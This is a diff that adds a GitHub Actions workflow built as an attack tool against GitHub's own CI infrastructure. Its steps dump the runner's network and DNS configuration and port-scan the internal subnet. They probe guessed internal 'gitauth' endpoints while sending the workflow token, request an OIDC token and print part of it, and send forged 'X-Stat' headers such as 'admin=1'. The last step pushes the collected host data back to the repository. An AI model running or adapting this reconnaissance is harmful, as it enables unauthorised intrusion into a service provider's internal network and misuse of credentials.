@@ -1,0 +1,205 @@
+name: gitauth-internal-638995
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  internal_recon:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: step1_dns_network
+        run: |
+          set -e
+          echo "=STEP1="
+          echo "--- resolv.conf ---"
+          cat /etc/resolv.conf
+          echo "--- hostname ---"
+          hostname; hostname -I
+          echo "--- ip addr ---"
+          ip addr show | grep 'inet '
+          echo "--- ip route ---"
+          ip route show
+          echo "--- /etc/hosts ---"
+          cat /etc/hosts
+          echo "--- DNS resolution ---"
+          for h in gitauth gitauth.service gitauth.github.net gitauth.github.internal \
+            gitauth.ghe.com internal.github.com github.internal git.internal \
+            upload.github.com altssh.github.com; do
+            r=$(getent hosts "$h" 2>/dev/null || dig +short "$h" 2>/dev/null | head -2 || echo "NXDOMAIN")
+            echo "DNS: $h -> $r"
+          done
+          echo "=STEP1_END="
+
+      - name: step2_port_scan
+        run: |
+          echo "=STEP2="
+          echo "--- /proc/net/tcp ---"
+          python3 << 'PYEOF'
+          import socket, struct
+          def decode(h):
+              ip_hex, port_hex = h.split(':')
+              ip = socket.inet_ntoa(struct.pack('<I', int(ip_hex, 16)))
+              port = int(port_hex, 16)
+              return ip, port
+          STATE_MAP = {1:'EST', 10:'LISTEN', 8:'CLOSE_WAIT', 6:'TIME_WAIT'}
+          with open('/proc/net/tcp') as f:
+              for line in f.readlines()[1:]:
+                  p = line.split()
+                  if len(p) > 9:
+                      lip, lport = decode(p[1])
+                      rip, rport = decode(p[2])
+                      snum = int(p[3], 16)
+                      state = STATE_MAP.get(snum, str(snum))
+                      print(f'{state} {lip}:{lport} <-> {rip}:{rport}')
+          PYEOF
+          echo "--- subnet port scan ---"
+          GW=$(ip route show default | awk '/default/ {print $3}' | head -1)
+          MY_IP=$(hostname -I | awk '{print $1}')
+          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
+          echo "Gateway=$GW Subnet=$SUBNET.0/24 MyIP=$MY_IP"
+          for i in 1 2 3 4 5 10 20 100 254; do
+            T="$SUBNET.$i"
+            for p in 8149 19418 8080 80 443 3000 4000 9000 5000; do
+              timeout 0.25 bash -c "echo '' > /dev/tcp/$T/$p" 2>/dev/null \
+                && echo "OPEN: $T:$p"
+            done
+          done
+          echo "=STEP2_END="
+
+      - name: step3_gitauth_probe
+        run: |
+          echo "=STEP3="
+          GW=$(ip route show default | awk '/default/ {print $3}' | head -1)
+          MY_IP=$(hostname -I | awk '{print $1}')
+          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
+          for T in $GW $SUBNET.1 $SUBNET.2 $SUBNET.3 $SUBNET.10 $SUBNET.254; do
+            for p in 8149 19418 8080 80 443 3000 9000; do
+              code=$(curl -sf --connect-timeout 0.4 -o /tmp/pr.txt -w "%{http_code}" \
+                     "http://$T:$p/" 2>/dev/null || echo "000")
+              if [ "$code" != "000" ]; then
+                echo "HTTP $code  $T:$p"
+                head -c 150 /tmp/pr.txt 2>/dev/null && echo
+              fi
+            done
+          done
+          echo "--- gitauth commit_refs probe ---"
+          for T in $GW $SUBNET.1 $SUBNET.2 $SUBNET.3 $SUBNET.10; do
+            for p in 8149 19418 8080 80; do
+              for path in /gitauth/commit_refs /commit_refs /api/gitauth /v1/gitauth; do
+                code=$(curl -sf --connect-timeout 0.4 \
+                       -H "Authorization: Bearer $GH_TOKEN" \
+                       -o /tmp/ga.txt -w "%{http_code}" "http://$T:$p$path" 2>/dev/null || echo "000")
+                [ "$code" != "000" ] && echo "gitauth: HTTP $code  $T:$p$path" \
+                  && head -c 200 /tmp/ga.txt 2>/dev/null && echo
+              done
+            done
+          done
+          echo "=STEP3_END="
+
+      - name: step4_oidc_xstat
+        run: |
+          echo "=STEP4="
+          echo "--- OIDC token request ---"
+          OIDC_RESP=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=gitauth" 2>/dev/null || echo '{"value":"FAILED"}')
+          OIDC_TOKEN=$(echo "$OIDC_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','NO_TOKEN'))" 2>/dev/null || echo "PARSE_ERROR")
+          echo "OIDC_TOKEN_LEN=${#OIDC_TOKEN}"
+          echo "OIDC_TOKEN_PREFIX=${OIDC_TOKEN:0:50}"
+
+          echo "--- X-Stat from git HTTP verbose ---"
+          curl -sv \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Git-Protocol: version=2" \
+            "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+            2>&1 | grep -iE '^[<>] |x-stat|x-github|server:|via:|babeld|gitauth|x-request' | head -40
+
+          echo "--- Request-Id samples (babeld routing encoded) ---"
+          for i in 1 2 3 4 5; do
+            RID=$(curl -sf -I \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+              2>/dev/null | grep -i 'x-github-request-id' | tr -d '\r' | awk '{print $2}')
+            echo "RequestId[$i]: $RID"
+            sleep 0.15
+          done
+
+          echo "--- OIDC to internal gitauth endpoints ---"
+          for TARGET in \
+            "https://api.github.com/_internal/gitauth/commit_refs" \
+            "https://api.github.com/gitauth/commit_refs" \
+            "https://github.com/_gitauth/commit_refs"; do
+            code=$(curl -sf --connect-timeout 2 \
+                   -H "Authorization: Bearer $OIDC_TOKEN" \
+                   -o /tmp/oidc.txt -w "%{http_code}" "$TARGET" 2>/dev/null || echo "000")
+            echo "OIDC: HTTP $code  $TARGET"
+            [ "$code" != "000" ] && [ "$code" != "404" ] && head -c 200 /tmp/oidc.txt && echo
+          done
+          echo "=STEP4_END="
+
+      - name: step5_xstat_forge
+        run: |
+          echo "=STEP5="
+          echo "--- X-Stat header injection test ---"
+          for XVAL in \
+            "authenticated=1" \
+            "user_id=1;repo_id=1;ok=1" \
+            "bypass=true" \
+            "admin=1" \
+            "ok" \
+            ""; do
+            code=$(curl -sf -I --connect-timeout 2 \
+                   -H "Authorization: Bearer $GH_TOKEN" \
+                   -H "X-Stat: $XVAL" \
+                   -o /dev/null -w "%{http_code}" \
+                   "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+                   2>/dev/null || echo "000")
+            echo "X-Stat='$XVAL' -> HTTP $code"
+          done
+          echo "--- Baseline headers vs with X-Stat ---"
+          BASE_HDRS=$(curl -sf -I \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+            2>/dev/null | grep -i '^x-' | sort | tr -d '\r')
+          echo "BASELINE: $BASE_HDRS"
+          WITH_HDRS=$(curl -sf -I \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "X-Stat: injected-value-12345" \
+            "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+            2>/dev/null | grep -i '^x-' | sort | tr -d '\r')
+          echo "WITH_XSTAT: $WITH_HDRS"
+          echo "=STEP5_END="
+
+      - name: step6_commit_results
+        run: |
+          echo "=STEP6="
+          cd /tmp
+          git clone --depth=1 -q \
+            "https://x-access-token:$GH_TOKEN@github.com/alish244/rce-injection-lab.git" \
+            pclone 2>&1 | tail -2 || true
+          if [ -d pclone ]; then
+            mkdir -p pclone/proof
+            cat > pclone/proof/gitauth_recon_638995.txt << TXTEOF
+nonce=638995
+hostname=$(hostname)
+ip=$(hostname -I)
+resolv=$(cat /etc/resolv.conf | tr '\n' '|')
+subnet=$(ip route show | head -5 | tr '\n' '|')
+TXTEOF
+            cd pclone
+            git config user.email "runner@github.com"
+            git config user.name "Runner"
+            git add -A
+            git commit -m "gitauth-638995" 2>/dev/null || true
+            git push origin main 2>&1 | tail -2 || true
+            echo "COMMITTED_gitauth_recon_638995"
+          fi
+          echo "=STEP6_END="
